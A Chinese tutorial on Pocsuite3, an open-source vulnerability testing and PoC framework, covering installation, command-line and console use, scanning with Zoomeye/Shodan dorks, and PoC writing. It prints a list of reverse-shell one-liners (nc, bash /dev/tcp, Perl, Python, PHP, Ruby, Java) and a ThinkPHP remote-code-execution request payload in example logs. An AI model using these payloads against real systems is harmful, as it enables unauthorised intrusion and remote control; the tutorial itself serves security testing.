## Python 安装

[Anaconda](https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/)

## 简介

Pocsuite 是由知道创宇404实验室打造的一款开源的远程漏洞测试框架。

你可以直接使用 Pocsuite 进行漏洞的验证与利用；你也可以基于 Pocsuite 进行 PoC/Exp 的开发，因为它也是一个 PoC 开发框架；同时，你还可以在你的漏洞测试工具里直接集成 Pocsuite，它也提供标准的调用类。同时它也集成了zoomeye、seebug、Ceye等读取指定漏洞特征进行自动化批量测试

Pocsuite2/Pocsuite3



## 安装

## pip 方式安装

```
pip install pocsuite3
```



## 源码安装

```
wget https://github.com/knownsec/pocsuite3/archive/master.zip
unzip master.zip
```

注意：pocsuite3 使用压缩包 安装需要 `requests-toolbelt` `requests`

如果同时也是Windows系统，除了上面的依赖还需要安装一个

```
pip install pyreadline # Windows console模式下使用，如果不使用可以不安装
```

检验安装效果。

另外需要注意的是，两种安装方式只可以取其一，不可同时安装。建议使用源码安装的方式。

## 用法

### 命令行方式

```

,------.                        ,--. ,--.       ,----.   {1.3.9.4-696cee0}
|  .--. ',---. ,---.,---.,--.,--`--,-'  '-.,---.'.-.  |
|  '--' | .-. | .--(  .-'|  ||  ,--'-.  .-| .-. : .' <
|  | --'' '-' \ `--.-'  `'  ''  |  | |  | \   --/'-'  |
`--'     `---' `---`----' `----'`--' `--'  `----`----'   http://pocsuite.org
Usage: pocsuite [options]

Options:   # 常规选项
  -h, --help            show this help message and exit
  --version             Show program's version number and exit
  --update              Update Pocsuite
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target: # 加载目标
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -f URL_FILE, --file=URL_FILE
                        Scan multiple targets given in a textual file
    -r POC              Load POC file from local or remote from seebug website
    -c CONFIGFILE       Load options from a configuration INI file

  Mode: # 运行模式
    Pocsuite running mode options

    --verify            Run poc with verify mode
    --attack            Run poc with attack mode
    --shell             Run poc with shell mode

  Request: #统一请求参数配置
    Network request options

    --cookie=COOKIE     HTTP Cookie header value
    --host=HOST         HTTP Host header value
    --referer=REFERER   HTTP Referer header value
    --user-agent=AGENT  HTTP User-Agent header value
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --proxy-cred=PROXY_CRED
                        Proxy authentication credentials (name:password)
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    --retry=RETRY       Time out retrials times.
    --delay=DELAY       Delay between two request of one thread
    --headers=HEADERS   Extra headers (e.g. "key1: value1\nkey2: value2")

  Account: # Token接口
    Telnet404 account options

    --login-user=LOGIN_USER
                        Telnet404 login user
    --login-pass=LOGIN_PASS
                        Telnet404 login password
    --shodan-token=SHODAN_TOKEN
                        Shodan token
    --censys-uid=CENSYS_UID
                        Censys uid
    --censys-secret=CENSYS_SECRET
                        Censys secret

  Modules: # 模块接口
    Modules(Seebug Zoomeye CEye Listener) options

    --dork=DORK         Zoomeye dork used for search.
    --dork-zoomeye=DORK_ZOOMEYE
                        Zoomeye dork used for search.
    --dork-shodan=DORK_SHODAN
                        Shodan dork used for search.
    --dork-censys=DORK_CENSYS
                        Censys dork used for search.
    --max-page=MAX_PAGE
                        Max page used in ZoomEye API(10 targets/Page).
    --search-type=SEARCH_TYPE
                        search type used in ZoomEye API, web or host
    --vul-keyword=VUL_KEYWORD
                        Seebug keyword used for search.
    --ssv-id=SSVID      Seebug SSVID number for target PoC.
    --lhost=CONNECT_BACK_HOST
                        Connect back host for target PoC in shell mode
    --lport=CONNECT_BACK_PORT
                        Connect back port for target PoC in shell mode
    --comparison        Compare popular web search engines

  Optimization: # 其他选项
    Optimization options

    --plugins=PLUGINS   Load plugins to execute
    --pocs-path=POCS_PATH
                        User defined poc scripts path
    --threads=THREADS   Max number of concurrent network requests (default 1)
    --batch=BATCH       Automatically choose defaut choice without asking.
    --requires          Check install_requires
    --quiet             Activate quiet mode, working without logger.

  Poc options: # PoC 预留接口
    definition options for PoC
```

#### 扫描单个目标

**-u URL, --url=URL** 从 url 测试 必须和-r 参数搭配

```
python cli.py -r pocs/thinkphp_rce2.py -u http://tp5023.hopa.cc/ --verify
```

#### 扫描多个目标

**-f URL_FILE, --file=URL_FILE ** 从文件中扫描必须和-r 参数搭配

扫描文本文件中给出的多个目标

```
python cli.py -r pocs/thinkphp_rce2.py -f url.txt --verify
```

#### 使用poc 

Pocsuite的运行模式默认是verify验证模式，此时对目标影响最小，也有attack和shell模式，对目标进行相关攻击与shell反弹(当然需要PoC的支持，Pocsuite的PoC编写格式预留了这三种模式的接口，并且有很多内置API帮助实现这三种接口)

**-r POCFILE** 

POCFILE可以是文件或Seebug SSVID。pocsuite插件可以从任何地方加载poc代码

#### verify/attack

**--verify**  使用`verify`模式运行 poc，PoC 仅仅使用扫描模式

 **--attack** 使用`attack`模式运行 poc，PoC 将使用攻击模式，可能执行一些危险命令

**--shell** 使用`shell`模式运行poc，PoC将使用攻击模式，当PoC shellcode成功执行时，pocsuite3将进入交互式shell。

#### Shell模式

Pocsuite3新增加了shell模式的设定，当你选择了此函数，Pocsuite3将会监听一个端口，并等待目标的反连。我们提供了各种语言用于反连的payload，以及用于生成在Windows/Linux平台下可执行的shellcode。

```python
class REVERSE_PAYLOAD:
    NC = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f"""
    NC2 = """nc -e /bin/sh {0} {1}"""
    NC3 = """rm -f /tmp/p;mknod /tmp/p p && nc {0} {1} 0/tmp/p"""
    BASH = """sh -i >& /dev/tcp/{0}/{1} 0>&1"""
    BASH2 = """sh -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1"""
    TELNET = """rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p"""
    PERL = """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
    PYTHON = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
    PHP = """php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    RUBY = """ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
    JAVA = """
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
    """
```



**注意：** 

#### 多线程模式

**--threads THREADS** 

使用多线程模式默认是使用单线程模式也就是线程数是1

```
python cli.py -r pocs/thinkphp_rce2.py -f url.txt --verify --threads 10
```

**--dork DORK**

ZoomEye 接口,通过特定指纹匹配进行验证或者攻击

```
python cli.py --dork 'port:6379' --vul-keyword 'redis' --max-page 2
```

### 交互式 Shell方式

#### 攻击流程

```flow
st=>start: 进入交互模式
search=>operation: 搜索 PoC (search thinkphp)
userpoc=>operation: 使用PoC (use pocs/thinkphp_rce2)
showoption=>operation: 查看选项 (show options)
settarget=>operation: 设置目标 (set target url)
check=>operation: 验证 (check)
showip=>operation: 显示本地ip(show ip)
bakip=>operation: 设置反弹ip(set lhost ip)
cond=>condition: verify or attack ?
attack=>operation: 攻击 (attack)
e=>end
st->search->userpoc->settarget->cond
cond(yes)->check->e
cond(no)->showip->bakip->attack->e
```
#### 进入交互模式

交互模式和msf很像

```
# python console.py

Pocsuite3 > help
Global commands:
    help                        Print this help menu
    use <module>                Select a module for usage
    search <search term>        Search for appropriate module
    list|show all               Show all available pocs
    exit                        Exit Pocsuite3
```

#### search   <search term> 搜索 POC

```
Pocsuite3 > search think
+-------+--------------------+
| Index |        Path        |
+-------+--------------------+
|   0   | pocs/thinkphp_rce  |
|   1   | pocs/thinkphp_rce2 |
+-------+--------------------+
```

#### list|show all 列出所有有效的 PoC

```
Pocsuite3 > list

+-------+------------------------------+------------------------------------------+
| Index |           Path               |                 Name                     |
+-------+------------------------------+------------------------------------------+
|   0   |    pocs/drupalgeddon2        |   Drupal core Remote Code Execution      |
+-------+------------------------------+------------------------------------------+

```

或者

```
Pocsuite3 > show all

+-------+------------------------------+------------------------------------------+
| Index |           Path               |                 Name                     |
+-------+------------------------------+------------------------------------------+
|   0   |    pocs/drupalgeddon2        |   Drupal core Remote Code Execution      |
+-------+------------------------------+------------------------------------------+
```



#### use  <module> 使用模块 可以使用索引编号

```
Pocsuite3 (pocs/thinkphp_rce2) > use pocs/thinkphp_rce2
Pocsuite3 (pocs/thinkphp_rce2) > show info

name                 Thinkphp 5.0.x 远程代码执行漏洞
version              1.0
author               ['chenghs']
vulDate              2019-1-11
createDate           2019-1-11
updateDate           2019-1-11
references           ['https://www.seebug.org/vuldb/ssvid-97765']
appPowerLink         http://www.thinkphp.cn/
appName              thinkphp
appVersion           thinkphp5.0.23
vulType              Code Execution
desc                 Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_POST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。
```

或者

```
Pocsuite3 (pocs/thinkphp_rce) > search think
+-------+--------------------+
| Index |        Path        |
+-------+--------------------+
|   0   | pocs/thinkphp_rce  |
|   1   | pocs/thinkphp_rce2 |
+-------+--------------------+
Pocsuite3 (pocs/thinkphp_rce) > use 1
Pocsuite3 (pocs/thinkphp_rce2) > show info

name                 ThinkPHP 5.x (v5.0.23及v5.1.31以下版本) 远程命令执行漏洞利用（GetShell）
version              1.0
author               ['chenghs']
vulDate              2018-12-09
createDate           2018-12-10
updateDate           2018-12-10
references           ['https://www.seebug.org/vuldb/ssvid-97715']
appPowerLink         http://www.thinkphp.cn/
appName              thinkphp
appVersion           thinkphp5.1.31
vulType              Code Execution
desc                 ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新
    ，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。
```



#### back 返回上一层

```
Pocsuite3 (pocs/thinkphp_rce2) > back
Pocsuite3 > 
```



### show options 显示相关选项

```
Pocsuite3 (pocs/thinkphp_rce2) > show options

Target options:
+---------+------------------+---------+---------------------------------------------------+
|   Name  | Current settings |   Type  |                       Descript                    |
+---------+------------------+---------+---------------------------------------------------+
|  target |    *require*     |  String |                ip:port (file://)                  |
| referer |                  |  String |              HTTP Referer header value            |
|  agent  |                  |  String |         HTTP User-Agent header value              |
|  proxy  |                  |  String |         Use a proxy to connect to the target URL  |
| timeout |        30        | Integer |     Seconds to wait before timeout connection     |
+---------+------------------+---------+---------------------------------------------------+

Module options:
+---------+--------------------------------+------+----------------------------------------+
|   Name  |        Current settings        | Type |        Descript                        |
+---------+--------------------------------+------+----------------------------------------+
| command | sh -i >& /dev/tcp/{0}/{1} 0>&1 | Dict |                                        |
|         |                                |      |bash:sh -i >& /dev/tcp/{0}/{1} 0>&1     |
|         |                                |      |                                        |
|         |                                |      |                                        |
+---------+--------------------------------+------+----------------------------------------+

Exploit payloads(using reverse tcp):
+-------+------------------+------+-------------------+
|  Name | Current settings | Type |      Descript     |
+-------+------------------+------+-------------------+
| lhost |    *require*     |  Ip  |  Connect back ip  |
| lport |      10086       | Port | Connect back port |
+-------+------------------+------+-------------------+
```



#### set <key> <value> 设置目标的值

```
Pocsuite3 (pocs/thinkphp_rce2) > set target http://tp5023.hopa.cc/
[17:05:32] [INFO] target => http://tp5023.hopa.cc/
Pocsuite3 (pocs/thinkphp_rce2) > check
[17:05:36] [INFO] pocsusite got a total of 1 tasks
[17:05:36] [INFO] running poc:'Thinkphp 5.0.x 远程代码执行漏洞' target 'http://tp5023.hopa.cc/'
[17:05:36] [+] URL : /index.php?s=captcha
[17:05:36] [+] Postdata : _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1

+------------------------+---------------------------------+--------+-----------+----------------+---------+
| target-url             |             poc-name            | poc-id | component |    version     |  status |
+------------------------+---------------------------------+--------+-----------+----------------+---------+
| http://tp5023.hopa.cc/ | Thinkphp 5.0.x 远程代码执行漏洞 | 97767  |  thinkphp | thinkphp5.0.23 | success |
+------------------------+---------------------------------+--------+-----------+----------------+---------+
success : 1 / 1
```

#### check/attack

```
Pocsuite3 (pocs/thinkphp_rce2) > check
[17:23:53] [INFO] pocsusite got a total of 1 tasks
[17:23:53] [INFO] running poc:'Thinkphp 5.0.x 远程代码执行漏洞' target 'http://tp5023.hopa.cc'
[17:23:53] [+] URL : /index.php?s=captcha
[17:23:53] [+] Postdata : _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1

+-----------------------+---------------------------------+--------+-----------+----------------+---------+
| target-url            |             poc-name            | poc-id | component |    version     |  status |
+-----------------------+---------------------------------+--------+-----------+----------------+---------+
| http://tp5023.hopa.cc | Thinkphp 5.0.x 远程代码执行漏洞 | 97767  |  thinkphp | thinkphp5.0.23 | success |
+-----------------------+---------------------------------+--------+-----------+----------------+---------+
```

### 从配置文件运行

有时候命令行命令太多，有些参数的重用性比较高，Pocsuite也提供了从配置文件中运行的方法。

我们以redis未授权访问漏洞为例，我们修改这个文件[pocsuite.ini](https://github.com/knownsec/pocsuite3/blob/master/pocsuite.ini)

[![img](https://images.seebug.org/content/images/2019/04/25/1556160947000-image-20190424115150193.png-w331s)](https://images.seebug.org/content/images/2019/04/25/1556160947000-image-20190424115150193.png-w331s)

[![img](https://images.seebug.org/content/images/2019/04/25/1556160947000-image-20190424115214571.png-w331s)](https://images.seebug.org/content/images/2019/04/25/1556160947000-image-20190424115214571.png-w331s)

[![img](https://images.seebug.org/content/images/2019/04/25/1556160947000-image-20190424115301182.png-w331s)](https://images.seebug.org/content/images/2019/04/25/1556160947000-image-20190424115301182.png-w331s)

[![img](https://images.seebug.org/content/images/2019/04/25/1556160947000-image-20190424115313719.png-w331s)](https://images.seebug.org/content/images/2019/04/25/1556160947000-image-20190424115313719.png-w331s)

线程也调整一下，RUN！

```
python3 cli.py -c ../pocsuite.ini
```

[![img](https://images.seebug.org/content/images/2019/04/25/1556160947000-image-20190424115513288.png-w331s)](https://images.seebug.org/content/images/2019/04/25/1556160947000-image-20190424115513288.png-w331s)

由于开启了comparsion参数，我们可以看到更多的信息

[![1](https://images.seebug.org/content/images/2019/04/25/1556160948000-1.png-w331s)](https://images.seebug.org/content/images/2019/04/25/1556160948000-1.png-w331s)

如果你同时还是Zoomeye VIP，搜集目标的同时也能够识别出蜜罐信息。目前只有通过Zoomeye接口获取的数据才能有蜜罐的标识。Shodan、Censys暂未开放相关API接口。



## 插件系统

Pocsuite支持了插件系统，按照加载目标(targets)，加载PoC(pocs)，结果处理(results)分为三种类型插件。

### Targets插件

除了本身可以使用-u、-f加载本地的目标之外，你可以编写一个targets类型插件从任何你想加载的地方加载目标(eg:Zoomeye、Shodan）甚至从网页上，redis，都可以。Pocsuite3内置了四种目标加载插件。

[![img](https://images.seebug.org/content/images/2019/04/25/1556160948000-image-20190423144435693.png-w331s)](https://images.seebug.org/content/images/2019/04/25/1556160948000-image-20190423144435693.png-w331s)

从上文可以看出，如果使用了搜索dork—dork、—dork_zoomeye、—dork_shodan、—dork_censys，相关插件将自动加载，无需手动指定。

### PoC 编写

编写流程

```flow
st=>start: 1. 编写poc
search=>operation: 2. 新建 PoC 文件
userpoc=>operation: 3. 编写DemoPoC 继承自PoCBase
showoption=>operation: 4. 填写 PoC 信息字段
settarget=>operation: 5. 编写验证模式
check=>operation: 6. 编写攻击模式
showip=>operation: 7. 编写shell模式
bakip=>operation: 8. 结果返回
e=>end: 9. 注册PoC实现类
st->search->userpoc->showoption->settarget->check->showip->bakip->e

```



pocsuite3 仅支持 Python3.x，如若编写 Python3 格式的 PoC，需要开发者具备一定的 Python3 基础

#### PoC 命名规范

1. 首先新建一个`.py`文件,文件名应当符合 [《PoC 命名规范》](https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md#namedstandard)
2. 编写 PoC 实现类`DemoPOC`,继承自`PoCBase`类.(DemoPOC 可以按照自己的意愿起名称)

```
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str

  class DemoPOC(POCBase):
    ...
```

3. 填写 PoC 信息字段,**要求认真填写所有基本信息字段**

```
    vulID = '1571'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    author = 'seebug' #  PoC作者的大名
    vulDate = '2014-10-16' #漏洞公开的时间,不知道就写今天
    createDate = '2014-10-16'# 编写 PoC 的日期
    updateDate = '2014-10-16'# PoC 更新的时间,默认和编写时间一样
    references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']# 漏洞地址来源,0day不用写
    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC'# PoC 名称
    appPowerLink = 'https://www.drupal.org/'# 漏洞厂商主页地址
    appName = 'Drupal'# 漏洞应用名称
    appVersion = '7.x'# 漏洞影响版本
    vulType = 'SQL Injection'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
        可以添加管理员、造成信息泄露。
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
```

4. 编写验证模式

```
  def _verify(self):
        output = Output(self)
        # 验证代码
        if result: # result是返回结果
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
```

5. 编写攻击模式

攻击模式可以对目标进行 getshell,查询管理员帐号密码等操作.定义它的方法与检测模式类似

```
def _attack(self):
    output = Output(self)
    result = {}
    # 攻击代码
```

和验证模式一样,攻击成功后需要把攻击得到结果赋值给 result 变量

**注意:如果该 PoC 没有攻击模式,可以在 _attack()函数下加入一句 return self._verify() 这样你就无需再写 _attack 函数了。**

6. 编写shell模式

pocsuite3 在 shell 模式 会默认监听`6666`端口， 编写对应的攻击代码，让目标执行反向连接 运行pocsuite3 系统IP的 `6666`端口即可得到一个shell

```
def _shell(self):
    cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
    # 攻击代码 execute cmd
```

shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出

7. 结果返回

不管是验证模式或者攻击模式，返回结果 result 中的 key 值必须按照下面的规范来写，result 各字段意义请参见[《PoC 结果返回规范》](https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md#resultstandard)

```
'Result':{
   'DBInfo' :   {'Username': 'xxx', 'Password': 'xxx', 'Salt': 'xxx' , 'Uid':'xxx' , 'Groupid':'xxx'},
   'ShellInfo': {'URL': 'xxx', 'Content': 'xxx' },
   'FileInfo':  {'Filename':'xxx','Content':'xxx'},
   'XSSInfo':   {'URL':'xxx','Payload':'xxx'},
   'AdminInfo': {'Uid':'xxx' , 'Username':'xxx' , 'Password':'xxx' }
   'Database':  {'Hostname':'xxx', 'Username':'xxx',  'Password':'xxx', 'DBname':'xxx'},
   'VerifyInfo':{'URL': 'xxx' , 'Postdata':'xxx' , 'Path':'xxx'}
   'SiteAttr':  {'Process':'xxx'}
   'Stdout': 'result output string'
}
```

output 为 Pocsuite 标准输出API，如果要输出调用成功信息则使用 `output.success(result)`,如果要输出调用失败则 `output.fail()`,系统自动捕获异常，不需要PoC里处理捕获,如果PoC里使用try...except 来捕获异常，可通过`output.error('Error Message')`来传递异常内容,建议直接使用模板中的parse_output通用结果处理函数对_verify和_attack结果进行处理。

```
def _verify(self, verify=True):
    result = {}
    ...

    return self.parse_output(result)

def parse_output(self, result):
    output = Output(self)
    if result:
        output.success(result)
    else:
        output.fail()
    return output
```

8. 注册PoC实现类

在类的外部调用register_poc()方法注册PoC类

```
class DemoPOC(POCBase):
    #POC内部代码

#注册 DemoPOC 类
register_poc(DemoPOC)
```

## 参考链接

[Pocsuite3官网](http://pocsuite.org/)

[如何打造自己的PoC框架-Pocsuite3-使用篇](https://paper.seebug.org/904/)



